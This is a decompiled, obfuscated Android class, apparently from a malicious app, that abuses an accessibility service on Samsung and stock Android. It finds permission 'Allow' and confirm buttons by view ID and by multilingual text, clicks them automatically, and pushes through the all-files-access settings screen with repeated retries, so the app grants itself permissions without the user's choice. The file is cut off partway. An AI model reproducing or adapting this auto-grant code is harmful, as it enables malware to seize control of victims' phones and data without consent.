package com.storm.safe.rock.service.modules.yw5xud;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.C1351vv;
import p000.b81;
import p000.dh0;
import p000.kg1;
import p000.t60;
import p000.tz0;
import p000.w20;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.yw5xud.a7 */
/* loaded from: classes2.dex */
public final class C0370a7 {

    /* renamed from: a0 */
    public final dqtvuisjd f55133a0;

    /* renamed from: a1 */
    public final Context f55134a1;

    /* renamed from: a2 */
    public final String f55135a2;

    /* renamed from: a3 */
    public final w20 f55136a3;

    /* renamed from: a4 */
    public final List f55137a4;

    public C0370a7(dqtvuisjd dqtvuisjdVar, Context context, String str) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(context, "context");
        t60.m214695b6(str, "LOG_TAG");
        this.f55133a0 = dqtvuisjdVar;
        this.f55134a1 = context;
        this.f55135a2 = str;
        this.f55136a3 = new w20(this);
        this.f55137a4 = AbstractC0716jf.m213306g5("com.android.permissioncontroller:id/permission_allow_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_one_time_button", "com.samsung.android.permissioncontroller:id/permission_allow_button", "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.samsung.android.permissioncontroller:id/permission_allow_one_time_button", "com.android.packageinstaller:id/permission_allow_button", "com.google.android.packageinstaller:id/permission_allow_button", "android:id/button1", "android:id/button2", "com.android.settings:id/action_button");
    }

    /* renamed from: a1 */
    public static final void m212355a1(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null && (string = text.toString()) != null && !AbstractC0779a1.m213663b6(string)) {
            arrayList.add(string);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212355a1(child, arrayList);
            }
        }
    }

    /* renamed from: a3 */
    public static boolean m212356a3(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
            return true;
        }
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        int i = 0;
        while (parent != null && i < 3) {
            if (parent.isClickable() && parent.performAction(16)) {
                return true;
            }
            AccessibilityNodeInfo parent2 = parent.getParent();
            parent.recycle();
            i++;
            parent = parent2;
        }
        return false;
    }

    /* renamed from: b1 */
    public static final void m212357b1(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "Toggle", true)) && accessibilityNodeInfo.isVisibleToUser() && !accessibilityNodeInfo.isChecked()) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212357b1(child, arrayList);
            }
        }
    }

    /* renamed from: b2 */
    public static AccessibilityNodeInfo m212358b2(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212358b2;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "Toggle", true)) && accessibilityNodeInfo.isVisibleToUser()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212358b2 = m212358b2(child)) != null) {
                return accessibilityNodeInfoM212358b2;
            }
        }
        return null;
    }

    /* renamed from: a0 */
    public final boolean m212359a0() {
        String string;
        AccessibilityNodeInfo rootInActiveWindow = this.f55133a0.getRootInActiveWindow();
        String str = this.f55135a2;
        if (rootInActiveWindow == null) {
            t60.m214704c5(str, "[三星] rootNode为null");
            return false;
        }
        ArrayList arrayList = new ArrayList();
        m212355a1(rootInActiveWindow, arrayList);
        arrayList.isEmpty();
        Iterator it = this.f55137a4.iterator();
        loop0: while (true) {
            if (!it.hasNext()) {
                Iterator it2 = ((List) AbstractC0369a6.f55132a0.getValue()).iterator();
                while (it2.hasNext()) {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it2.next());
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                            if (!accessibilityNodeInfo.isVisibleToUser()) {
                                accessibilityNodeInfo.recycle();
                            } else if (!accessibilityNodeInfo.isClickable() || !accessibilityNodeInfo.performAction(16)) {
                                AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                                int i = 0;
                                while (parent != null && i < 5) {
                                    if (!parent.isClickable() || !parent.performAction(16)) {
                                        AccessibilityNodeInfo parent2 = parent.getParent();
                                        parent.recycle();
                                        i++;
                                        parent = parent2;
                                    }
                                }
                                accessibilityNodeInfo.recycle();
                            }
                        }
                    }
                }
                t60.m214726f4(str, "[三星] 未找到允许按钮");
                return false;
            }
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId((String) it.next());
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByViewId) {
                        CharSequence className = accessibilityNodeInfo2.getClassName();
                        if (className == null || (string = className.toString()) == null) {
                            string = "";
                        }
                        if (AbstractC0779a1.m213652a5(string, "Button", true) && accessibilityNodeInfo2.isVisibleToUser() && accessibilityNodeInfo2.performAction(16)) {
                            break loop0;
                        }
                    }
                }
            } catch (Exception e) {
                tz0.m214810b0("[三星] ViewID查找异常: ", e.getMessage(), str);
            }
        }
        return true;
    }

    /* renamed from: a2 */
    public final void m212360a2() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55133a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return;
        }
        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55750a0, AbstractC0716jf.m213306g5("Allow", "允许", "허용", "許可", "Autoriser", "Permitir", "Zulassen", "OK", "Confirm", "确认", "確認", "확인"));
        Iterator it = AbstractC0716jf.m213306g5("android:id/button1", "com.android.settings:id/action_button", "android:id/button_positive").iterator();
        while (true) {
            boolean zHasNext = it.hasNext();
            String str = this.f55135a2;
            if (!zHasNext) {
                int size = arrayListM213298i5.size();
                int i = 0;
                while (i < size) {
                    Object obj = arrayListM213298i5.get(i);
                    i++;
                    String str2 = (String) obj;
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str2);
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                            if (accessibilityNodeInfo.isVisibleToUser()) {
                                if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                                    t60.m214714d6(str, "[确认对话框] 通过文本'" + str2 + "'点击确认按钮");
                                    return;
                                }
                                AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                                for (int i2 = 0; parent != null && i2 < 5; i2++) {
                                    if (parent.isClickable() && parent.performAction(16)) {
                                        t60.m214714d6(str, "[确认对话框] 通过文本'" + str2 + "'的父节点点击确认按钮");
                                        return;
                                    }
                                    parent = parent.getParent();
                                }
                            }
                        }
                    }
                }
                return;
            }
            String str3 = (String) it.next();
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str3);
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByViewId) {
                        if (accessibilityNodeInfo2.isVisibleToUser() && accessibilityNodeInfo2.isClickable() && accessibilityNodeInfo2.performAction(16)) {
                            t60.m214714d6(str, "[确认对话框] 通过ViewID(" + str3 + ")点击确认按钮");
                            return;
                        }
                    }
                }
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:35:0x0092  */
    /* JADX WARN: Removed duplicated region for block: B:39:0x00a0  */
    /* JADX WARN: Removed duplicated region for block: B:42:0x00a9  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x00b7  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x00c0  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x00cf  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x00d8  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x00dc  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212361a4(ContinuationImpl continuationImpl) {
        SamsungSteps$execute$1 samsungSteps$execute$1;
        C0370a7 c0370a7;
        int i;
        C0370a7 c0370a72;
        C0370a7 c0370a73;
        C0370a7 c0370a74;
        int i2;
        if (continuationImpl instanceof SamsungSteps$execute$1) {
            samsungSteps$execute$1 = (SamsungSteps$execute$1) continuationImpl;
            int i3 = samsungSteps$execute$1.f54683a4;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                samsungSteps$execute$1.f54683a4 = i3 - Integer.MIN_VALUE;
            } else {
                samsungSteps$execute$1 = new SamsungSteps$execute$1(this, continuationImpl);
            }
        }
        Object objM212363a6 = samsungSteps$execute$1.f54681a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = samsungSteps$execute$1.f54683a4;
        if (i4 == 0) {
            kg1.m213544f4(objM212363a6);
            samsungSteps$execute$1.f54679a0 = this;
            samsungSteps$execute$1.f54680a1 = 1;
            samsungSteps$execute$1.f54683a4 = 1;
            objM212363a6 = m212363a6(samsungSteps$execute$1);
            if (objM212363a6 != coroutineSingletons) {
                c0370a7 = this;
                i = 1;
            }
            return coroutineSingletons;
        }
        if (i4 != 1) {
            if (i4 == 2) {
                i = samsungSteps$execute$1.f54680a1;
                c0370a72 = samsungSteps$execute$1.f54679a0;
                kg1.m213544f4(objM212363a6);
                if (!((Boolean) objM212363a6).booleanValue()) {
                    i = 0;
                }
                samsungSteps$execute$1.f54679a0 = c0370a72;
                samsungSteps$execute$1.f54680a1 = i;
                samsungSteps$execute$1.f54683a4 = 3;
                objM212363a6 = c0370a72.m212365a8(samsungSteps$execute$1);
                if (objM212363a6 != coroutineSingletons) {
                    c0370a73 = c0370a72;
                    if (!((Boolean) objM212363a6).booleanValue()) {
                    }
                    samsungSteps$execute$1.f54679a0 = c0370a73;
                    samsungSteps$execute$1.f54680a1 = i;
                    samsungSteps$execute$1.f54683a4 = 4;
                    objM212363a6 = c0370a73.m212366a9(samsungSteps$execute$1);
                    if (objM212363a6 != coroutineSingletons) {
                    }
                }
                return coroutineSingletons;
            }
            if (i4 == 3) {
                i = samsungSteps$execute$1.f54680a1;
                c0370a73 = samsungSteps$execute$1.f54679a0;
                kg1.m213544f4(objM212363a6);
                if (!((Boolean) objM212363a6).booleanValue()) {
                    i = 0;
                }
                samsungSteps$execute$1.f54679a0 = c0370a73;
                samsungSteps$execute$1.f54680a1 = i;
                samsungSteps$execute$1.f54683a4 = 4;
                objM212363a6 = c0370a73.m212366a9(samsungSteps$execute$1);
                if (objM212363a6 != coroutineSingletons) {
                    c0370a74 = c0370a73;
                    if (!((Boolean) objM212363a6).booleanValue()) {
                    }
                    samsungSteps$execute$1.f54679a0 = null;
                    samsungSteps$execute$1.f54680a1 = i;
                    samsungSteps$execute$1.f54683a4 = 5;
                    objM212363a6 = c0370a74.m212362a5(samsungSteps$execute$1);
                    if (objM212363a6 != coroutineSingletons) {
                    }
                }
                return coroutineSingletons;
            }
            if (i4 != 4) {
                if (i4 != 5) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i2 = samsungSteps$execute$1.f54680a1;
                kg1.m213544f4(objM212363a6);
                if (!((Boolean) objM212363a6).booleanValue()) {
                    i2 = 0;
                }
                return Boolean.valueOf(i2 != 0);
            }
            i = samsungSteps$execute$1.f54680a1;
            c0370a74 = samsungSteps$execute$1.f54679a0;
            kg1.m213544f4(objM212363a6);
            if (!((Boolean) objM212363a6).booleanValue()) {
                i = 0;
            }
            samsungSteps$execute$1.f54679a0 = null;
            samsungSteps$execute$1.f54680a1 = i;
            samsungSteps$execute$1.f54683a4 = 5;
            objM212363a6 = c0370a74.m212362a5(samsungSteps$execute$1);
            if (objM212363a6 != coroutineSingletons) {
                i2 = i;
                if (!((Boolean) objM212363a6).booleanValue()) {
                }
                return Boolean.valueOf(i2 != 0);
            }
            return coroutineSingletons;
        }
        i = samsungSteps$execute$1.f54680a1;
        c0370a7 = samsungSteps$execute$1.f54679a0;
        kg1.m213544f4(objM212363a6);
        if (!((Boolean) objM212363a6).booleanValue()) {
            i = 0;
        }
        samsungSteps$execute$1.f54679a0 = c0370a7;
        samsungSteps$execute$1.f54680a1 = i;
        samsungSteps$execute$1.f54683a4 = 2;
        objM212363a6 = c0370a7.m212364a7(samsungSteps$execute$1);
        if (objM212363a6 != coroutineSingletons) {
            c0370a72 = c0370a7;
            if (!((Boolean) objM212363a6).booleanValue()) {
            }
            samsungSteps$execute$1.f54679a0 = c0370a72;
            samsungSteps$execute$1.f54680a1 = i;
            samsungSteps$execute$1.f54683a4 = 3;
            objM212363a6 = c0370a72.m212365a8(samsungSteps$execute$1);
            if (objM212363a6 != coroutineSingletons) {
            }
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Code restructure failed: missing block: B:107:0x01b7, code lost:
    
        if (p000.b81.m210571b1(2000, r2) != r3) goto L114;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:65:0x00e3 A[Catch: Exception -> 0x0044, TryCatch #2 {Exception -> 0x0044, blocks: (B:18:0x003f, B:101:0x018c, B:23:0x0049, B:96:0x0174, B:98:0x017a, B:26:0x0050, B:93:0x0164, B:29:0x0057, B:88:0x0152, B:90:0x0158, B:32:0x005e, B:83:0x013a, B:35:0x0065, B:78:0x0122, B:80:0x0128, B:85:0x013d, B:38:0x006c, B:73:0x0108, B:41:0x0073, B:68:0x00f0, B:70:0x00f6, B:75:0x010b, B:44:0x007a, B:63:0x00dd, B:65:0x00e3), top: B:115:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:70:0x00f6 A[Catch: Exception -> 0x0044, TryCatch #2 {Exception -> 0x0044, blocks: (B:18:0x003f, B:101:0x018c, B:23:0x0049, B:96:0x0174, B:98:0x017a, B:26:0x0050, B:93:0x0164, B:29:0x0057, B:88:0x0152, B:90:0x0158, B:32:0x005e, B:83:0x013a, B:35:0x0065, B:78:0x0122, B:80:0x0128, B:85:0x013d, B:38:0x006c, B:73:0x0108, B:41:0x0073, B:68:0x00f0, B:70:0x00f6, B:75:0x010b, B:44:0x007a, B:63:0x00dd, B:65:0x00e3), top: B:115:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x010b A[Catch: Exception -> 0x0044, TryCatch #2 {Exception -> 0x0044, blocks: (B:18:0x003f, B:101:0x018c, B:23:0x0049, B:96:0x0174, B:98:0x017a, B:26:0x0050, B:93:0x0164, B:29:0x0057, B:88:0x0152, B:90:0x0158, B:32:0x005e, B:83:0x013a, B:35:0x0065, B:78:0x0122, B:80:0x0128, B:85:0x013d, B:38:0x006c, B:73:0x0108, B:41:0x0073, B:68:0x00f0, B:70:0x00f6, B:75:0x010b, B:44:0x007a, B:63:0x00dd, B:65:0x00e3), top: B:115:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:78:0x0122 A[Catch: Exception -> 0x0044, PHI: r0
      0x0122: PHI (r0v13 com.storm.safe.rock.service.modules.yw5xud.a7) = 
      (r0v8 com.storm.safe.rock.service.modules.yw5xud.a7)
      (r0v10 com.storm.safe.rock.service.modules.yw5xud.a7)
      (r0v14 com.storm.safe.rock.service.modules.yw5xud.a7)
     binds: [B:64:0x00e1, B:76:0x011e, B:35:0x0065] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0044, blocks: (B:18:0x003f, B:101:0x018c, B:23:0x0049, B:96:0x0174, B:98:0x017a, B:26:0x0050, B:93:0x0164, B:29:0x0057, B:88:0x0152, B:90:0x0158, B:32:0x005e, B:83:0x013a, B:35:0x0065, B:78:0x0122, B:80:0x0128, B:85:0x013d, B:38:0x006c, B:73:0x0108, B:41:0x0073, B:68:0x00f0, B:70:0x00f6, B:75:0x010b, B:44:0x007a, B:63:0x00dd, B:65:0x00e3), top: B:115:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0128 A[Catch: Exception -> 0x0044, TryCatch #2 {Exception -> 0x0044, blocks: (B:18:0x003f, B:101:0x018c, B:23:0x0049, B:96:0x0174, B:98:0x017a, B:26:0x0050, B:93:0x0164, B:29:0x0057, B:88:0x0152, B:90:0x0158, B:32:0x005e, B:83:0x013a, B:35:0x0065, B:78:0x0122, B:80:0x0128, B:85:0x013d, B:38:0x006c, B:73:0x0108, B:41:0x0073, B:68:0x00f0, B:70:0x00f6, B:75:0x010b, B:44:0x007a, B:63:0x00dd, B:65:0x00e3), top: B:115:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:85:0x013d A[Catch: Exception -> 0x0044, TryCatch #2 {Exception -> 0x0044, blocks: (B:18:0x003f, B:101:0x018c, B:23:0x0049, B:96:0x0174, B:98:0x017a, B:26:0x0050, B:93:0x0164, B:29:0x0057, B:88:0x0152, B:90:0x0158, B:32:0x005e, B:83:0x013a, B:35:0x0065, B:78:0x0122, B:80:0x0128, B:85:0x013d, B:38:0x006c, B:73:0x0108, B:41:0x0073, B:68:0x00f0, B:70:0x00f6, B:75:0x010b, B:44:0x007a, B:63:0x00dd, B:65:0x00e3), top: B:115:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:90:0x0158 A[Catch: Exception -> 0x0044, TryCatch #2 {Exception -> 0x0044, blocks: (B:18:0x003f, B:101:0x018c, B:23:0x0049, B:96:0x0174, B:98:0x017a, B:26:0x0050, B:93:0x0164, B:29:0x0057, B:88:0x0152, B:90:0x0158, B:32:0x005e, B:83:0x013a, B:35:0x0065, B:78:0x0122, B:80:0x0128, B:85:0x013d, B:38:0x006c, B:73:0x0108, B:41:0x0073, B:68:0x00f0, B:70:0x00f6, B:75:0x010b, B:44:0x007a, B:63:0x00dd, B:65:0x00e3), top: B:115:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:95:0x0173  */
    /* JADX WARN: Removed duplicated region for block: B:96:0x0174 A[Catch: Exception -> 0x0044, PHI: r0
      0x0174: PHI (r0v20 com.storm.safe.rock.service.modules.yw5xud.a7) = 
      (r0v16 com.storm.safe.rock.service.modules.yw5xud.a7)
      (r0v18 com.storm.safe.rock.service.modules.yw5xud.a7)
      (r0v21 com.storm.safe.rock.service.modules.yw5xud.a7)
     binds: [B:89:0x0156, B:94:0x0171, B:23:0x0049] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0044, blocks: (B:18:0x003f, B:101:0x018c, B:23:0x0049, B:96:0x0174, B:98:0x017a, B:26:0x0050, B:93:0x0164, B:29:0x0057, B:88:0x0152, B:90:0x0158, B:32:0x005e, B:83:0x013a, B:35:0x0065, B:78:0x0122, B:80:0x0128, B:85:0x013d, B:38:0x006c, B:73:0x0108, B:41:0x0073, B:68:0x00f0, B:70:0x00f6, B:75:0x010b, B:44:0x007a, B:63:0x00dd, B:65:0x00e3), top: B:115:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:98:0x017a A[Catch: Exception -> 0x0044, TryCatch #2 {Exception -> 0x0044, blocks: (B:18:0x003f, B:101:0x018c, B:23:0x0049, B:96:0x0174, B:98:0x017a, B:26:0x0050, B:93:0x0164, B:29:0x0057, B:88:0x0152, B:90:0x0158, B:32:0x005e, B:83:0x013a, B:35:0x0065, B:78:0x0122, B:80:0x0128, B:85:0x013d, B:38:0x006c, B:73:0x0108, B:41:0x0073, B:68:0x00f0, B:70:0x00f6, B:75:0x010b, B:44:0x007a, B:63:0x00dd, B:65:0x00e3), top: B:115:0x0028 }] */
    /* JADX WARN: Type inference failed for: r0v0, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r0v24 */
    /* JADX WARN: Type inference failed for: r0v25 */
    /* JADX WARN: Type inference failed for: r0v4 */
    /* JADX WARN: Type inference failed for: r0v5 */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212362a5(ContinuationImpl continuationImpl) throws Throwable {
        SamsungSteps$executeAllFilesAccess$1 samsungSteps$executeAllFilesAccess$1;
        C0370a7 c0370a7;
        C0370a7 c0370a72 = this.f55134a1;
        if (continuationImpl instanceof SamsungSteps$executeAllFilesAccess$1) {
            samsungSteps$executeAllFilesAccess$1 = (SamsungSteps$executeAllFilesAccess$1) continuationImpl;
            int i = samsungSteps$executeAllFilesAccess$1.f54687a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                samsungSteps$executeAllFilesAccess$1.f54687a3 = i - Integer.MIN_VALUE;
            } else {
                samsungSteps$executeAllFilesAccess$1 = new SamsungSteps$executeAllFilesAccess$1(this, continuationImpl);
            }
        }
        Object obj = samsungSteps$executeAllFilesAccess$1.f54685a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = samsungSteps$executeAllFilesAccess$1.f54687a3;
        SamsungSteps$FlowType samsungSteps$FlowType = SamsungSteps$FlowType.f54676a4;
        try {
            try {
            } catch (Exception e) {
                tz0.m214807a7("[文件访问] 备用方式也失败: ", e.getMessage(), c0370a72.f55135a2);
            }
        } catch (Exception e2) {
            e = e2;
        }
        switch (i2) {
            case 0:
                kg1.m213544f4(obj);
                if (Build.VERSION.SDK_INT < 30) {
                    return Boolean.TRUE;
                }
                w20 w20Var = this.f55136a3;
                if (w20Var.m214993a8(samsungSteps$FlowType)) {
                    return Boolean.TRUE;
                }
                if (w20Var.m214987a2(samsungSteps$FlowType)) {
                    t60.m214726f4(this.f55135a2, "[文件访问] 达到最大尝试次数");
                    return Boolean.TRUE;
                }
                w20Var.m214989a4(samsungSteps$FlowType);
                try {
                    Intent intent = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                    intent.setData(Uri.parse("package:" + c0370a72.getPackageName()));
                    intent.setFlags(1350598656);
                    c0370a72.startActivity(intent);
                    samsungSteps$executeAllFilesAccess$1.f54684a0 = this;
                    samsungSteps$executeAllFilesAccess$1.f54687a3 = 1;
                } catch (Exception e3) {
                    e = e3;
                    c0370a72 = this;
                    tz0.m214807a7("[文件访问] 异常: ", e.getMessage(), c0370a72.f55135a2);
                    Intent intent2 = new Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION");
                    intent2.setFlags(276824064);
                    c0370a72.f55134a1.startActivity(intent2);
                    samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a72;
                    samsungSteps$executeAllFilesAccess$1.f54687a3 = 10;
                    c0370a72 = c0370a72;
                    break;
                }
                if (b81.m210571b1(2000L, samsungSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                    c0370a7 = this;
                    if (!c0370a7.m212367b0()) {
                        samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a7;
                        samsungSteps$executeAllFilesAccess$1.f54687a3 = 2;
                        if (b81.m210571b1(1500L, samsungSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                            if (!Environment.isExternalStorageManager()) {
                                c0370a7.f55136a3.m214996b1(samsungSteps$FlowType);
                                samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a7;
                                samsungSteps$executeAllFilesAccess$1.f54687a3 = 3;
                                if (c0370a7.m212369b4(samsungSteps$executeAllFilesAccess$1) == coroutineSingletons) {
                                }
                                return Boolean.TRUE;
                            }
                            t60.m214714d6(c0370a7.f55135a2, "[文件访问] 权限未立即生效，尝试点击确认对话框...");
                            c0370a7.m212360a2();
                            samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a7;
                            samsungSteps$executeAllFilesAccess$1.f54687a3 = 4;
                            if (b81.m210571b1(1500L, samsungSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                                if (!Environment.isExternalStorageManager()) {
                                    c0370a7.f55136a3.m214996b1(samsungSteps$FlowType);
                                    samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a7;
                                    samsungSteps$executeAllFilesAccess$1.f54687a3 = 5;
                                    if (c0370a7.m212369b4(samsungSteps$executeAllFilesAccess$1) == coroutineSingletons) {
                                    }
                                    return Boolean.TRUE;
                                }
                                t60.m214714d6(c0370a7.f55135a2, "[文件访问] 第一次点击未生效，重试...");
                                samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a7;
                                samsungSteps$executeAllFilesAccess$1.f54687a3 = 6;
                                if (b81.m210571b1(500L, samsungSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                                    if (!c0370a7.m212367b0()) {
                                        samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a7;
                                        samsungSteps$executeAllFilesAccess$1.f54687a3 = 7;
                                        if (b81.m210571b1(1500L, samsungSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                                            c0370a7.m212360a2();
                                            samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a7;
                                            samsungSteps$executeAllFilesAccess$1.f54687a3 = 8;
                                            if (b81.m210571b1(1500L, samsungSteps$executeAllFilesAccess$1) == coroutineSingletons) {
                                                if (Environment.isExternalStorageManager()) {
                                                    c0370a7.f55136a3.m214996b1(samsungSteps$FlowType);
                                                    samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a7;
                                                    samsungSteps$executeAllFilesAccess$1.f54687a3 = 9;
                                                    if (c0370a7.m212369b4(samsungSteps$executeAllFilesAccess$1) == coroutineSingletons) {
                                                    }
                                                    return Boolean.TRUE;
                                                }
                                                return Boolean.FALSE;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                c0370a7 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                if (!c0370a7.m212367b0()) {
                }
                return coroutineSingletons;
            case 2:
                c0370a7 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                if (!Environment.isExternalStorageManager()) {
                }
                return coroutineSingletons;
            case 3:
                C0370a7 c0370a73 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            case 4:
                c0370a7 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                if (!Environment.isExternalStorageManager()) {
                }
                return coroutineSingletons;
            case 5:
                C0370a7 c0370a74 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            case 6:
                c0370a7 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                if (!c0370a7.m212367b0()) {
                }
                return coroutineSingletons;
            case 7:
                c0370a7 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                c0370a7.m212360a2();
                samsungSteps$executeAllFilesAccess$1.f54684a0 = c0370a7;
                samsungSteps$executeAllFilesAccess$1.f54687a3 = 8;
                if (b81.m210571b1(1500L, samsungSteps$executeAllFilesAccess$1) == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                c0370a7 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                if (Environment.isExternalStorageManager()) {
                }
                return Boolean.FALSE;
            case 9:
                C0370a7 c0370a75 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            case 10:
                C0370a7 c0370a76 = samsungSteps$executeAllFilesAccess$1.f54684a0;
                kg1.m213544f4(obj);
                c0370a72 = c0370a76;
                return Boolean.FALSE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:51:0x00cd  */
